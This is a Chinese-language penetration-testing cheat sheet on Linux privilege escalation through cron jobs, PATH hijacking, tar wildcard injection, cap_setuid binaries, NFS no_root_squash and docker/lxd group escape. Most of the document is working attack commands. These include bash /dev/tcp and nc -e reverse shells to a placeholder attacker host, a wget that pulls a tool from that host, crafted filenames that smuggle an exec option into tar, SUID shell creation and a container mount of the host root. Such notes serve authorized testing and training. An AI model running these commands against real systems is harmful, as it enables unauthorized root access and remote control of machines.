# 定时任务 路径劫持与能力提权

## 适用场景

- 存在以 root 运行且当前用户可写脚本/目录的 cron 任务。
- cron 脚本调用相对路径命令，且当前用户可写某个 PATH 目录。
- cron 里用了带通配符的 tar / rsync / chown 等命令。
- 目标有 `cap_setuid` 等危险 capability、NFS `no_root_squash` 导出、docker/lxd 组成员身份。

## 枚举命令

```bash
crontab -l                                        # 当前用户 crontab
cat /etc/crontab                                  # 系统级 crontab
ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/ 2>/dev/null
cat /etc/cron.d/* 2>/dev/null                     # 系统 cron 条目
grep -R "sh\|bash\|python\|tar\|rsync\|curl\|wget" /etc/cron* /var/spool/cron 2>/dev/null
find / -writable -type f 2>/dev/null | grep -v proc    # 找可写文件（找可写 cron 脚本）
find / -writable -type d 2>/dev/null | grep -v proc    # 找可写目录（PATH / 依赖劫持）
getcap -r / 2>/dev/null                           # 查找 capabilities
id                                                # 查看组（docker/lxd 等）
cat /etc/exports                                  # 查看 NFS 导出（找 no_root_squash）
```

## 利用步骤

### 1. cron 脚本注入反弹 shell

```bash
# 若 /usr/local/bin/backup.sh 以 root 执行且当前用户可写
echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' >> /usr/local/bin/backup.sh
# 或 nc 反弹
echo 'nc -e /bin/sh <LHOST> <LPORT>' >> /usr/local/bin/backup.sh
# 监听端
nc -lvnp <LPORT>
```

### 2. PATH 劫持

```bash
# cron 脚本调用相对命令（如 tar、rsync）且未写绝对路径
# 找一个可写 PATH 目录，如 /tmp 或某可写 bin 目录，放同名恶意二进制
echo '#!/bin/bash' > /tmp/tar
echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' >> /tmp/tar
chmod +x /tmp/tar
# 若 PATH 里 /tmp 排在系统 bin 前，root 跑 cron 时会执行恶意 tar
# 监听端
nc -lvnp <LPORT>
```

### 3. 通配符注入（tar / rsync）

```bash
# 前提：cron 以 root 在含当前用户可写文件的目录执行 tar * 或 tar -czf backup.tgz *
cd /path/to/cron/workdir
echo 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' > shell.sh
chmod +x shell.sh
# 构造文件名，被 tar 当作参数执行
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
# tar 扫描到这些文件时触发 exec
nc -lvnp <LPORT>
```

### 4. Capabilities 提权

```bash
getcap -r / 2>/dev/null
# 输出示例：/usr/bin/python3.8 = cap_setuid+ep
./python3.8 -c 'import os; os.setuid(0); os.system("sh")'
# 也可找 cap_setuid 的其他二进制到 GTFOBins 查 payload
```

### 5. NFS no_root_squash

```bash
# 目标机 /etc/exports 里某目录带 no_root_squash
# 攻击机挂载并放 SUID shell
mkdir /mnt/nfs
mount -t nfs <IP>:/path /mnt/nfs
cp /bin/bash /mnt/nfs/
chmod 4755 /mnt/nfs/bash
# 目标机上运行该 bash 即得 root
/mnt/nfs/bash -p
```

### 6. docker / lxd 组逃逸

```bash
# docker 组成员
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# lxd 组成员（先在攻击机构建 alpine 镜像，传到目标后初始化并挂载根分区）
# 攻击机
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder && ./build-alpine
# 目标机导入镜像
lxc image import ./alpine-v3.*-x86_64.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
# 进入后访问 /mnt/root 即宿主根目录
```

### 7. pspy64 无 root 监控进程

```bash
# 上传 pspy64 到 /tmp，观察 root 定时执行了什么
wget http://<LHOST>:8000/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
/tmp/pspy64 -pf -i 1000      # -pf 显示完整命令，-i 1000 每秒刷新
```

## 常见坑

- cron 里 `%` 会被当换行符，写 cron 命令含 `%` 需转义 `\%`。
- cron 环境变量极少（PATH 常只有 /usr/bin:/bin），写反弹 shell 一定用绝对路径或先 `export PATH`。
- 通配符注入只对「目录里存在名字形如选项的文件」生效，必须先 `cd` 到被扫描目录。
- docker/lxd 逃逸需要当前用户在对应组里，`id` 先确认，不满足则需先提权进组。
- 新版 tar 可能已加 `--` 边界或提示，触发失败时换 rsync 或其它带通配符的命令。
